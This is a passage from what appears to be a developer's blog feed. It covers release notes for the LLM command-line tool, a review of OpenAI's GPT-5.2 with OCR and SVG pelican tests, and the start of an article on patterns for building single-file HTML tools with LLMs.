I released a new version of my &lt;a href="https://llm.datasette.io/"&gt;LLM&lt;/a&gt; Python library and CLI tool for interacting with Large Language Models. Highlights from the release notes:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;New OpenAI models: &lt;code&gt;gpt-5.1&lt;/code&gt;, &lt;code&gt;gpt-5.1-chat-latest&lt;/code&gt;, &lt;code&gt;gpt-5.2&lt;/code&gt; and &lt;code&gt;gpt-5.2-chat-latest&lt;/code&gt;. &lt;a href="https://github.com/simonw/llm/issues/1300"&gt;#1300&lt;/a&gt;, &lt;a href="https://github.com/simonw/llm/issues/1317"&gt;#1317&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;When fetching URLs as fragments using &lt;code&gt;llm -f URL&lt;/code&gt;, the request now includes a custom user-agent header: &lt;code&gt;llm/VERSION (https://llm.datasette.io/)&lt;/code&gt;. &lt;a href="https://github.com/simonw/llm/issues/1309"&gt;#1309&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Fixed a bug where fragments were not correctly registered with their source when using &lt;code&gt;llm chat&lt;/code&gt;. Thanks, &lt;a href="https://github.com/grota"&gt;Giuseppe Rota&lt;/a&gt;. &lt;a href="https://github.com/simonw/llm/pull/1316"&gt;#1316&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Fixed some file descriptor leak warnings. Thanks, &lt;a href="https://github.com/eedeebee"&gt;Eric Bloch&lt;/a&gt;. &lt;a href="https://github.com/simonw/llm/issues/1313"&gt;#1313&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Type annotations for the OpenAI Chat, AsyncChat and Completion &lt;code&gt;execute()&lt;/code&gt; methods. Thanks, &lt;a href="https://github.com/ar-jan"&gt;Arjan Mossel&lt;/a&gt;. &lt;a href="https://github.com/simonw/llm/pull/1315"&gt;#1315&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The project now uses &lt;code&gt;uv&lt;/code&gt; and dependency groups for development. See the updated &lt;a href="https://llm.datasette.io/en/stable/contributing.html"&gt;contributing documentation&lt;/a&gt;. &lt;a href="https://github.com/simonw/llm/issues/1318"&gt;#1318&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;That last bullet point about &lt;code&gt;uv&lt;/code&gt; relates to the dependency groups pattern I &lt;a href="https://til.simonwillison.net/uv/dependency-groups"&gt;wrote about in a recent TIL&lt;/a&gt;. I'm currently working through applying it to my other projects - the net result is that running the test suite is as simple as doing:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/simonw/llm
cd llm
uv run pytest
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The new &lt;code&gt;dev&lt;/code&gt; dependency group &lt;a href="https://github.com/simonw/llm/blob/0.28/pyproject.toml#L44-L69"&gt;defined in pyproject.toml&lt;/a&gt; is automatically installed by &lt;code&gt;uv run&lt;/code&gt; in a new virtual environment which means everything needed to run &lt;code&gt;pytest&lt;/code&gt; is available without needing to add any extra commands.


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/projects"&gt;projects&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/annotated-release-notes"&gt;annotated-release-notes&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm"&gt;llm&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/uv"&gt;uv&lt;/a&gt;&lt;/p&gt;



</summary><category term="projects"/><category term="python"/><category term="ai"/><category term="annotated-release-notes"/><category term="generative-ai"/><category term="llms"/><category term="llm"/><category term="uv"/></entry><entry><title>GPT-5.2</title><link href="https://simonwillison.net/2025/Dec/11/gpt-52/#atom-everything" rel="alternate"/><published>2025-12-11T23:58:04+00:00</published><updated>2025-12-11T23:58:04+00:00</updated><id>https://simonwillison.net/2025/Dec/11/gpt-52/#atom-everything</id><summary type="html">
    &lt;p&gt;OpenAI reportedly &lt;a href="https://www.wsj.com/tech/ai/openais-altman-declares-code-red-to-improve-chatgpt-as-google-threatens-ai-lead-7faf5ea6"&gt;declared a "code red"&lt;/a&gt; on the 1st of December in response to increasingly credible competition from the likes of Google's Gemini 3. It's less than two weeks later and they just &lt;a href="https://openai.com/index/introducing-gpt-5-2/"&gt;announced GPT-5.2&lt;/a&gt;, calling it "the most capable model series yet for professional knowledge work".&lt;/p&gt;
&lt;h4 id="key-characteristics-of-gpt-5-2"&gt;Key characteristics of GPT-5.2&lt;/h4&gt;
&lt;p&gt;The new model comes in two variants: GPT-5.2 and GPT-5.2 Pro. There's no Mini variant yet.&lt;/p&gt;
&lt;p&gt;GPT-5.2 is available via their UI in both "instant" and "thinking" modes, presumably still corresponding to the API concept of different reasoning effort levels.&lt;/p&gt;
&lt;p&gt;The knowledge cut-off date for both variants is now &lt;strong&gt;August 31st 2025&lt;/strong&gt;. This is significant - GPT 5.1 and 5 were both Sep 30, 2024 and GPT-5 mini was May 31, 2024.&lt;/p&gt;
&lt;p&gt;Both of the 5.2 models have a 400,000 token context window and 128,000 max output tokens - no different from 5.1 or 5.&lt;/p&gt;
&lt;p&gt;Pricing wise 5.2 is a rare &lt;em&gt;increase&lt;/em&gt; - it's 1.4x the cost of GPT 5.1, at $1.75/million input and $14/million output. GPT-5.2 Pro is $21.00/million input and a hefty $168.00/million output, putting it &lt;a href="https://www.llm-prices.com/#sel=gpt-4.5%2Co1-pro%2Cgpt-5.2-pro"&gt;up there&lt;/a&gt; with their previous most expensive models o1 Pro and GPT-4.5.&lt;/p&gt;
&lt;p&gt;So far the main benchmark results we have are self-reported by OpenAI. The most interesting ones are a 70.9% score on their GDPval "Knowledge work tasks" benchmark (GPT-5 got 38.8%) and a 52.9% on ARC-AGI-2 (up from 17.6% for GPT-5.1 Thinking).&lt;/p&gt;
&lt;p&gt;The ARC Prize Twitter account provided &lt;a href="https://x.com/arcprize/status/1999182732845547795"&gt;this interesting note&lt;/a&gt; on the efficiency gains for GPT-5.2 Pro&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A year ago, we verified a preview of an unreleased version of @OpenAI
o3 (High) that scored 88% on ARC-AGI-1 at est. $4.5k/task&lt;/p&gt;
&lt;p&gt;Today, we’ve verified a new GPT-5.2 Pro (X-High) SOTA score of 90.5% at $11.64/task&lt;/p&gt;
&lt;p&gt;This represents a ~390X efficiency improvement in one year&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;GPT-5.2 can be accessed in OpenAI's Codex CLI tool like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;codex -m gpt-5.2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There are three new API models:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://platform.openai.com/docs/models/gpt-5.2"&gt;gpt-5.2&lt;/a&gt; - I think this is what you get if you select "GPT-5.2 Thinking" in ChatGPT but &lt;a href="https://twitter.com/simonw/status/1999603339382976785"&gt;I'm a little confused&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://platform.openai.com/docs/models/gpt-5.2-chat-latest"&gt;gpt-5.2-chat-latest&lt;/a&gt; - the model used by ChatGPT for "GPT-5.2 Instant" mode. It's priced the same as GPT-5.2 but has a reduced 128,000 context window with 16,384 max output tokens.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://platform.openai.com/docs/models/gpt-5.2-pro"&gt;gpt-5.2-pro&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;OpenAI have published a new &lt;a href="https://cookbook.openai.com/examples/gpt-5/gpt-5-2_prompting_guide"&gt;GPT-5.2 Prompting Guide&lt;/a&gt;. An interesting note from that document is that compaction can now be run with &lt;a href="https://platform.openai.com/docs/api-reference/responses/compact"&gt;a new dedicated server-side API&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For long-running, tool-heavy workflows that exceed the standard context window, GPT-5.2 with Reasoning supports response compaction via the &lt;code&gt;/responses/compact&lt;/code&gt; endpoint. Compaction performs a loss-aware compression pass over prior conversation state, returning encrypted, opaque items that preserve task-relevant information while dramatically reducing token footprint. This allows the model to continue reasoning across extended workflows without hitting context limits.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id="it-s-better-at-vision"&gt;It's better at vision&lt;/h4&gt;
&lt;p&gt;One note from the announcement that caught my eye:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GPT‑5.2 Thinking is our strongest vision model yet, cutting error rates roughly in half on chart reasoning and software interface understanding.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I had &lt;a href="https://simonwillison.net/2025/Aug/29/the-perils-of-vibe-coding/"&gt;disappointing results from GPT-5&lt;/a&gt; on an OCR task a while ago. I tried it against GPT-5.2 and it did &lt;em&gt;much&lt;/em&gt; better:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -m gpt-5.2 ocr -a https://static.simonwillison.net/static/2025/ft.jpeg&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here's &lt;a href="https://gist.github.com/simonw/b4a13f1e424e58b8b0aca72ae2c3cb00"&gt;the result&lt;/a&gt; from that, which cost 1,520 input and 1,022 for a total of &lt;a href="https://www.llm-prices.com/#it=1520&amp;amp;ot=1022&amp;amp;sel=gpt-5.2"&gt;1.6968 cents&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id="rendering-some-pelicans"&gt;Rendering some pelicans&lt;/h4&gt;
&lt;p&gt;For my classic "Generate an SVG of a pelican riding a bicycle" test:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -m gpt-5.2 &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Generate an SVG of a pelican riding a bicycle&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/gpt-2.5-pelican.png" alt="Described by GPT-5.2: Cartoon-style illustration: A white, duck-like bird with a small black eye, oversized orange beak (with a pale blue highlight along the lower edge), and a pink neckerchief rides a blue-framed bicycle in side view; the bike has two large black wheels with gray spokes, a blue front fork, visible black crank/pedal area, and thin black handlebar lines, with gray motion streaks and a soft gray shadow under the bike on a light-gray road; background is a pale blue sky with a simple yellow sun at upper left and two rounded white clouds (one near upper center-left and one near upper right)." style="max-width: 100%;" /&gt;&lt;/p&gt;
&lt;p&gt;And for the more advanced alternative test, which tests instruction following in a little more depth:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;llm -m gpt-5.2 &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Generate an SVG of a California brown pelican riding a bicycle. The bicycle&lt;/span&gt;
&lt;span class="pl-s"&gt;must have spokes and a correctly shaped bicycle frame. The pelican must have its&lt;/span&gt;
&lt;span class="pl-s"&gt;characteristic large pouch, and there should be a clear indication of feathers.&lt;/span&gt;
&lt;span class="pl-s"&gt;The pelican must be clearly pedaling the bicycle. The image should show the full&lt;/span&gt;
&lt;span class="pl-s"&gt;breeding plumage of the California brown pelican.&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/gpt-5.2-p2.png" alt="Digital illustration on a light gray/white background with a thin horizontal baseline: a stylized California brown pelican in breeding plumage is drawn side-on, leaning forward and pedaling a bicycle; the pelican has a dark brown body with layered wing lines, a pale cream head with a darker brown cap and neck shading, a small black eye, and an oversized long golden-yellow bill extending far past the front wheel; one brown leg reaches down to a pedal while the other is tucked back; the bike is shown in profile with two large spoked wheels (black tires, white rims), a dark frame, crank and chainring near the rear wheel, a black saddle above the rear, and the front fork aligned under the pelican’s head; text at the top reads &amp;quot;California brown pelican (breeding plumage) pedaling a bicycle&amp;quot;." style="max-width: 100%;" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update 14th December 2025&lt;/strong&gt;: I used GPT-5.2 running in Codex CLI to &lt;a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/"&gt;port a complex Python library to JavaScript&lt;/a&gt;. It ran without interference for nearly four hours and completed a complex task exactly to my specification.&lt;/p&gt;
    
        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm"&gt;llm&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pelican-riding-a-bicycle"&gt;pelican-riding-a-bicycle&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-release"&gt;llm-release&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/gpt-5"&gt;gpt-5&lt;/a&gt;&lt;/p&gt;
    

</summary><category term="ai"/><category term="openai"/><category term="generative-ai"/><category term="llms"/><category term="llm"/><category term="pelican-riding-a-bicycle"/><category term="llm-release"/><category term="gpt-5"/></entry><entry><title>Useful patterns for building HTML tools</title><link href="https://simonwillison.net/2025/Dec/10/html-tools/#atom-everything" rel="alternate"/><published>2025-12-10T21:00:59+00:00</published><updated>2025-12-10T21:00:59+00:00</updated><id>https://simonwillison.net/2025/Dec/10/html-tools/#atom-everything</id><summary type="html">
    &lt;p&gt;I've started using the term &lt;strong&gt;HTML tools&lt;/strong&gt; to refer to HTML applications that I've been building which combine HTML, JavaScript, and CSS in a single file and use them to provide useful functionality. I have built &lt;a href="https://tools.simonwillison.net/"&gt;over 150 of these&lt;/a&gt; in the past two years, almost all of them written by LLMs. This article presents a collection of useful patterns I've discovered along the way.&lt;/p&gt;
&lt;p&gt;First, some examples to show the kind of thing I'm talking about:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/svg-render?url=https://gist.githubusercontent.com/simonw/aedecb93564af13ac1596810d40cac3c/raw/83e7f3be5b65bba61124684700fa7925d37c36c3/tiger.svg"&gt;svg-render&lt;/a&gt;&lt;/strong&gt; renders SVG code to downloadable JPEGs or PNGs&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/pypi-changelog?package=llm&amp;amp;compare=0.27...0.27.1"&gt;pypi-changelog&lt;/a&gt;&lt;/strong&gt; lets you generate (and copy to clipboard) diffs between different PyPI package releases.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/bluesky-thread?url=https%3A%2F%2Fbsky.app%2Fprofile%2Fsimonwillison.net%2Fpost%2F3m7gzjew3ss2e&amp;amp;view=thread"&gt;bluesky-thread&lt;/a&gt;&lt;/strong&gt; provides a nested view of a discussion thread on Bluesky.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/svg-render?url=https://gist.githubusercontent.com/simonw/aedecb93564af13ac1596810d40cac3c/raw/83e7f3be5b65bba61124684700fa7925d37c36c3/tiger.svg" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/svg-render.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of svg-render" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/pypi-changelog?package=llm&amp;amp;compare=0.27...0.27.1" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/pypi-changelog.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of pypi-changelog" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/bluesky-thread?url=https%3A%2F%2Fbsky.app%2Fprofile%2Fsimonwillison.net%2Fpost%2F3m7gzjew3ss2e&amp;amp;view=thread" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/bluesky-thread.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of bluesky-thread" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;p&gt;These are some of my recent favorites. I have dozens more like this that I use on a regular basis.&lt;/p&gt;
&lt;p&gt;You can explore my collection on &lt;strong&gt;&lt;a href="https://tools.simonwillison.net/"&gt;tools.simonwillison.net&lt;/a&gt;&lt;/strong&gt; - the &lt;a href="https://tools.simonwillison.net/by-month"&gt;by month&lt;/a&gt; view is useful for browsing the entire collection.&lt;/p&gt;
&lt;p&gt;If you want to see the code and prompts, almost all of the examples in this post include a link in their footer to "view source" on GitHub. The GitHub commits usually contain either the prompt itself or a link to the transcript used to create the tool.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#the-anatomy-of-an-html-tool"&gt;The anatomy of an HTML tool&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#prototype-with-artifacts-or-canvas"&gt;Prototype with Artifacts or Canvas&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#switch-to-a-coding-agent-for-more-complex-projects"&gt;Switch to a coding agent for more complex projects&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#load-dependencies-from-cdns"&gt;Load dependencies from CDNs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#host-them-somewhere-else"&gt;Host them somewhere else&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#take-advantage-of-copy-and-paste"&gt;Take advantage of copy and paste&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#build-debugging-tools"&gt;Build debugging tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#persist-state-in-the-url"&gt;Persist state in the URL&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#use-localstorage-for-secrets-or-larger-state"&gt;Use localStorage for secrets or larger state&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#collect-cors-enabled-apis"&gt;Collect CORS-enabled APIs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#llms-can-be-called-directly-via-cors"&gt;LLMs can be called directly via CORS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#don-t-be-afraid-of-opening-files"&gt;Don't be afraid of opening files&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#you-can-offer-downloadable-files-too"&gt;You can offer downloadable files too&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#pyodide-can-run-python-code-in-the-browser"&gt;Pyodide can run Python code in the browser&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#webassembly-opens-more-possibilities"&gt;WebAssembly opens more possibilities&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#remix-your-previous-tools"&gt;Remix your previous tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#record-the-prompt-and-transcript"&gt;Record the prompt and transcript&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://simonwillison.net/2025/Dec/10/html-tools/#go-forth-and-build"&gt;Go forth and build&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="the-anatomy-of-an-html-tool"&gt;The anatomy of an HTML tool&lt;/h4&gt;
&lt;p&gt;These are the characteristics I have found to be most productive in building tools of this nature:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;A single file: inline JavaScript and CSS in a single HTML file means the least hassle in hosting or distributing them, and crucially means you can copy and paste them out of an LLM response.&lt;/li&gt;
&lt;li&gt;Avoid React, or anything with a build step. The problem with React is that JSX requires a build step, which makes everything massively less convenient. I prompt "no react" and skip that whole rabbit hole entirely.&lt;/li&gt;
&lt;li&gt;Load dependencies from a CDN. The fewer dependencies the better, but if there's a well known library that helps solve a problem I'm happy to load it from CDNjs or jsdelivr or similar.&lt;/li&gt;
&lt;li&gt;Keep them small. A few hundred lines means the maintainability of the code doesn't matter too much: any good LLM can read them and understand what they're doing, and rewriting them from scratch with help from an LLM takes just a few minutes.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The end result is a few hundred lines of code that can be cleanly copied and pasted into a GitHub repository.&lt;/p&gt;
&lt;h4 id="prototype-with-artifacts-or-canvas"&gt;Prototype with Artifacts or Canvas&lt;/h4&gt;
&lt;p&gt;The easiest way to build one of these tools is to start in ChatGPT or Claude or Gemini. All three have features where they can write a simple HTML+JavaScript application and show it to you directly.&lt;/p&gt;
&lt;p&gt;Claude calls this "Artifacts", ChatGPT and Gemini both call it "Canvas". Claude has the feature enabled by default, ChatGPT and Gemini may require you to toggle it on in their "tools" menus.&lt;/p&gt;
&lt;p&gt;Try this prompt in Gemini or ChatGPT:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Build a canvas that lets me paste in JSON and converts it to YAML. No React.&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Or this prompt in Claude:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Build an artifact that lets me paste in JSON and converts it to YAML. No React.&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I always add "No React" to these prompts, because otherwise they tend to build with React, resulting in a file that is harder to copy and paste out of the LLM and use elsewhere. I find that attempts which use React take longer to display (since they need to run a build step) and are more likely to contain crashing bugs for some reason, especially in ChatGPT.&lt;/p&gt;
&lt;p&gt;All three tools have "share" links that provide a URL to the finished application. Examples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://chatgpt.com/canvas/shared/6938e8ece53c8191a2f9d7dfcd090d11"&gt;ChatGPT JSON to YAML Canvas&lt;/a&gt; made with GPT-5.1 Thinking - here's &lt;a href="https://chatgpt.com/share/6938e926-ee14-8006-9678-383b3a8dac78"&gt;the full ChatGPT transcript&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://claude.ai/public/artifacts/61fdecb8-6e3b-4162-a5ab-6720dfe5ed19"&gt;Claude JSON to YAML Artifact&lt;/a&gt; made with Claude Opus 4.5 - here's &lt;a href="https://claude.ai/share/421bacb9-54b4-45b4-b41c-a436bc0ebd53"&gt;the full Claude transcript&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://gemini.google.com/share/03c1ac87aa40"&gt;Gemini JSON to YAML Canvas&lt;/a&gt; made with Gemini 3 Pro - here's &lt;a href="https://gemini.google.com/share/1e27a1d8cdca"&gt;the full Gemini transcript&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="switch-to-a-coding-agent-for-more-complex-projects"&gt;Switch to a coding agent for more complex projects&lt;/h4&gt;
&lt;p&gt;Coding agents such as Claude Code and Codex CLI have the advantage that they can test the code themselves while they work on it using tools like Playwright. I often upgrade to one of those when I'm working on something more complicated, like my Bluesky thread viewer tool shown above.&lt;/p&gt;
&lt;p&gt;I also frequently use &lt;strong&gt;asynchronous coding agents&lt;/strong&gt; like Claude Code for web to make changes to existing tools. I shared a video about that in &lt;a href="https://simonwillison.net/2025/Oct/23/claude-code-for-web-video/"&gt;Building a tool to copy-paste share terminal sessions using Claude Code for web&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Claude Code for web and Codex Cloud run directly against my &lt;a href="https://github.com/simonw/tools"&gt;simonw/tools&lt;/a&gt; repo, which means they can publish or upgrade tools via Pull Requests (here are &lt;a href="https://github.com/simonw/tools/pulls?q=is%3Apr+is%3Aclosed"&gt;dozens of examples&lt;/a&gt;) without me needing to copy and paste anything myself.&lt;/p&gt;
&lt;h4 id="load-dependencies-from-cdns"&gt;Load dependencies from CDNs&lt;/h4&gt;
&lt;p&gt;Any time I use an additional JavaScript library as part of my tool I like to load it from a CDN.&lt;/p&gt;
&lt;p&gt;The three major LLM platforms support specific CDNs as part of their Artifacts or Canvas features, so often if you tell them "Use PDF.js" or similar they'll be able to compose a URL to a CDN that's on their allow-list.&lt;/p&gt;
&lt;p&gt;Sometimes you'll need to go and look up the URL on &lt;a href="https://cdnjs.com/"&gt;cdnjs&lt;/a&gt; or &lt;a href="https://www.jsdelivr.com/"&gt;jsDelivr&lt;/a&gt; and paste it into the chat.&lt;/p&gt;
&lt;p&gt;CDNs like these have been around for long enough that I've grown to trust them, especially for URLs that include the package version.&lt;/p&gt;
&lt;p&gt;The alternative to CDNs is to use npm and have a build step for your projects. I find this reduces my productivity at hacking on individual tools and makes it harder to self-host them.&lt;/p&gt;
&lt;h4 id="host-them-somewhere-else"&gt;Host them somewhere else&lt;/h4&gt;
&lt;p&gt;I don't like leaving my HTML tools hosted by the LLM platforms themselves for a couple of reasons. First, LLM platforms tend to run the tools inside a tight sandbox with a lot of restrictions. They're often unable to load data or images from external URLs, and sometimes even features like linking out to other sites are disabled.&lt;/p&gt;
&lt;p&gt;The end-user experience often isn't great either. They show warning messages to new users, often take additional time to load and delight in showing promotions for the platform that was used to create the tool.&lt;/p&gt;
&lt;p&gt;They're also not as reliable as other forms of static hosting. If ChatGPT or Claude are having an outage I'd like to still be able to access the tools I've created in the past.&lt;/p&gt;
&lt;p&gt;Being able to easily self-host is the main reason I like insisting on "no React" and using CDNs for dependencies - the absence of a build step makes hosting tools elsewhere a simple case of copying and pasting them out to some other provider.&lt;/p&gt;
&lt;p&gt;My preferred provider here is &lt;a href="https://docs.github.com/en/pages"&gt;GitHub Pages&lt;/a&gt; because I can paste a block of HTML into a file on github.com and have it hosted on a permanent URL a few seconds later. Most of my tools end up in my &lt;a href="https://github.com/simonw/tools"&gt;simonw/tools&lt;/a&gt; repository which is configured to serve static files at &lt;a href="https://tools.simonwillison.net/"&gt;tools.simonwillison.net&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id="take-advantage-of-copy-and-paste"&gt;Take advantage of copy and paste&lt;/h4&gt;
&lt;p&gt;One of the most useful input/output mechanisms for HTML tools comes in the form of &lt;strong&gt;copy and paste&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;I frequently build tools that accept pasted content, transform it in some way and let the user copy it back to their clipboard to paste somewhere else.&lt;/p&gt;
&lt;p&gt;Copy and paste on mobile phones is fiddly, so I frequently include "Copy to clipboard" buttons that populate the clipboard with a single touch.&lt;/p&gt;
&lt;p&gt;Most operating system clipboards can carry multiple formats of the same copied data. That's why you can paste content from a word processor in a way that preserves formatting, but if you paste the same thing into a text editor you'll get the content with formatting stripped.&lt;/p&gt;
&lt;p&gt;These rich copy operations are available in JavaScript paste events as well, which opens up all sorts of opportunities for HTML tools.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/hacker-news-thread-export"&gt;hacker-news-thread-export&lt;/a&gt;&lt;/strong&gt; lets you paste in a URL to a Hacker News thread and gives you a copyable condensed version of the entire thread, suitable for pasting into an LLM to get a useful summary.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/paste-rich-text"&gt;paste-rich-text&lt;/a&gt;&lt;/strong&gt; lets you copy from a page and paste to get the HTML - particularly useful on mobile where view-source isn't available.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/alt-text-extractor"&gt;alt-text-extractor&lt;/a&gt;&lt;/strong&gt; lets you paste in images and then copy out their alt text.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/hacker-news-thread-export" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/hacker-news-thread-export.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of hacker-news-thread-export" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/paste-rich-text" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/paste-rich-text.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of paste-rich-text" /&gt;&lt;/a&gt;
